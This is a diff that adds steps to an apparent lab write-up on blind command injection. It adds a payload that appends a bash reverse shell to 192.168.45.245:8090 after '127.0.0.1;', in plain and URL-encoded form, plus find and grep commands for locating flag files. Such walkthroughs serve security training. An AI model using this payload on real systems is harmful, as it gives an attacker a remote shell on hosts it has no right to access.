@@ -107,6 +107,28 @@ cat blind_exercise.php
 ```
 ![lab_extra_mile_blind_command_injection_flag](images/lab_extra_mile_blind_command_injection_flag.png)
 
+- Also you can use the bash reverse shell.
+Payload:
+```
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.45.245/8090 0>&1'
+```
+
+URL Encoded Payload:
+```
+127.0.0.1%3B%20bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.245/8090%200%3E%261%27
+```
+
+- Search for the flag
+1.Search for other common proof files by filename patterns, such as
+```
+find /var/www/html -type f \( -iname "*local*" -o -iname "*proof*" -o -iname "*secret*" \)
+```
+
+
+2.Check contents of readable files that might contain embedded flags, e.g.:
+```
+grep -i "flag" /var/www/html/* -R
+```
 
 ### **Enumeration and Exploitation**
 
